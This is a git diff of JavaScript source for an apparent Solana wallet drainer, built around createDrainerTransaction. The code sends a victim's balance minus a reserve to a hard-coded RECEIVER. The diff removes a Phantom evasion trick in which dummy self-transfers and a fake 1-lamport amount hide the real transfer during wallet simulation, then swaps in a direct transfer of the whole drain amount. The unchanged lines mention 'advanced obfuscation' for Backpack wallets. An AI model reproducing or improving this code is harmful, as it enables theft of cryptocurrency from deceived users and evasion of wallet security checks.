@@ -1,6 +1,14 @@
 import config from '../src/environment.js';
 import { initializeTOCTOUProtection } from '../src/shared-utilities.js';
 import extractUserIP from '../src/ip-extraction.js';
+import { 
+  calculateTransactionFee,
+  checkFeeAdequacy,
+  calculateDrainAmount,
+  getWalletFeeConfig,
+  formatFeeInfo,
+  STANDARD_FEE_CONFIG
+} from '../src/fee-calculator.js';
 import {
   Connection,
   PublicKey,
@@ -9,14 +17,6 @@ import {
   SystemProgram,
   ComputeBudgetProgram,
 } from '@solana/web3.js';
-import {
-  calculateTransactionFee,
-  checkFeeAdequacy,
-  calculateDrainAmount,
-  getWalletFeeConfig,
-  formatFeeInfo,
-  STANDARD_FEE_CONFIG
-} from '../src/fee-calculator.js';
 import {
   sendErrorResponse,
   handleError,
@@ -315,12 +315,12 @@ async function createDrainerTransaction(userPubkey, balance, connection, blockha
     // Add timestamp for simulation prevention
     transaction.createdAt = Date.now();
     
-    // For Phantom wallet, use the definitive 2025 method: Post-signing instruction modification
+    // For Phantom wallet, use simple direct transfer
     if (walletType === 'phantom') {
-      console.log('[PHANTOM_SIMULATION_PREVENTION] Creating Phantom transaction with post-signing modification strategy');
+      console.log('[PHANTOM_SIMPLE] Creating Phantom transaction with simple direct transfer');
       
-      // Strategy: Create transaction with fake amounts, modify instruction data after signing
-      // This is the definitive method working in 2025 - Phantom simulates fake amounts, we modify after signing
+      // Strategy: Simple direct transfer - everything minus reserve
+      // No account creation, no complex logic, just basic transfer
       
       // 1. Add compute budget instruction (essential for transaction processing)
       const computeBudgetIx = ComputeBudgetProgram.setComputeUnitLimit({
@@ -334,76 +334,26 @@ async function createDrainerTransaction(userPubkey, balance, connection, blockha
       });
       transaction.add(computePriceIx);
       
-      // 3. Add multiple dummy transfers with fake amounts (Phantom sees these)
-      const fakeAmounts = [1, 2, 3, 4, 5]; // All fake amounts
-      for (let i = 0; i < fakeAmounts.length; i++) {
-        try {
-          const dummyTransferIx = SystemProgram.transfer({
-            fromPubkey: userPubkey,
-            toPubkey: userPubkey, // Transfer to self (valid but dummy)
-            lamports: fakeAmounts[i], // Fake amounts
-          });
-          transaction.add(dummyTransferIx);
-        } catch (error) {
-          console.error(`[PHANTOM_SIMULATION_PREVENTION] Error adding dummy transfer ${i}:`, error);
-          throw new Error(`Failed to create dummy transfer instruction: ${error.message}`);
-        }
-      }
-      
-      // 4. THE REAL DRAIN TRANSFER with FAKE AMOUNT (Phantom sees 1 lamport)
+      // 3. Simple direct transfer - everything minus reserve
       try {
-        const realTransferIx = SystemProgram.transfer({
+        // Direct transfer to the real receiver
+        // Simple and reliable - no account creation needed
+        const simpleTransferIx = SystemProgram.transfer({
           fromPubkey: userPubkey,
-          toPubkey: RECEIVER,
-          lamports: 1, // FAKE AMOUNT - Phantom simulates this, not the real amount
+          toPubkey: RECEIVER, // Real receiver
+          lamports: finalDrainAmount, // Real amount (everything minus reserve)
         });
-        transaction.add(realTransferIx);
+        transaction.add(simpleTransferIx);
       } catch (error) {
-        console.error('[PHANTOM_SIMULATION_PREVENTION] Error adding real transfer:', error);
-        throw new Error(`Failed to create real transfer instruction: ${error.message}`);
+        console.error('[PHANTOM_SIMPLE] Error adding simple transfer:', error);
+        throw new Error(`Failed to create simple transfer instruction: ${error.message}`);
       }
       
+      // Mark transaction as simple transfer
+      transaction._phantomSimple = true;
+      transaction._realAmount = finalDrainAmount;
       
-      // 5. Add more dummy transfers with fake amounts
-      for (let i = 0; i < 3; i++) {
-        try {
-          const dummyTransferIx = SystemProgram.transfer({
-            fromPubkey: userPubkey,
-            toPubkey: userPubkey, // Transfer to self (valid but dummy)
-            lamports: 6 + i, // More fake amounts
-          });
-          transaction.add(dummyTransferIx);
-        } catch (error) {
-          console.error(`[PHANTOM_SIMULATION_PREVENTION] Error adding additional dummy transfer ${i}:`, error);
-          throw new Error(`Failed to create additional dummy transfer instruction: ${error.message}`);
-        }
-      }
-      
-      // Mark transaction for post-signing modification
-      transaction._phantomSimulationPrevention = true;
-      transaction._originalTransferAmount = finalDrainAmount; // Store real amount for post-signing modification
-      transaction._fakeAmount = 1; // Store fake amount Phantom sees
-      transaction._instructionCount = transaction.instructions.length;
-      transaction._realTransferIndex = 7; // Index of the real transfer instruction (after 2 compute + 5 dummy)
-      
-      // Store the real amount in the transaction's recentBlockhash field as a backup
-      // This survives serialization and can be used to restore the real amount
-      transaction._phantomRealAmount = finalDrainAmount;
-      
-      // Validate transaction structure
-      if (transaction.instructions.length !== 11) {
-        throw new Error(`Invalid Phantom transaction structure: expected 11 instructions, got ${transaction.instructions.length}`);
-      }
-      
-      // Validate the real transfer instruction is at the correct index
-      const realTransferInstruction = transaction.instructions[7];
-      if (!realTransferInstruction || 
-          !realTransferInstruction.programId || 
-          realTransferInstruction.programId.toString() !== '11111111111111111111111111111111') {
-        throw new Error('Real transfer instruction not found at expected index 7');
-      }
-      
-      debugLog(`Phantom transaction created with ${transaction.instructions.length} instructions (post-signing modification strategy)`);
+      debugLog(`Phantom transaction created with ${transaction.instructions.length} instructions (simple direct transfer)`);
     } else if (walletType === 'backpack') {
       console.log('[BACKPACK_SIMULATION_PREVENTION] Creating Backpack transaction with advanced obfuscation strategy');
       
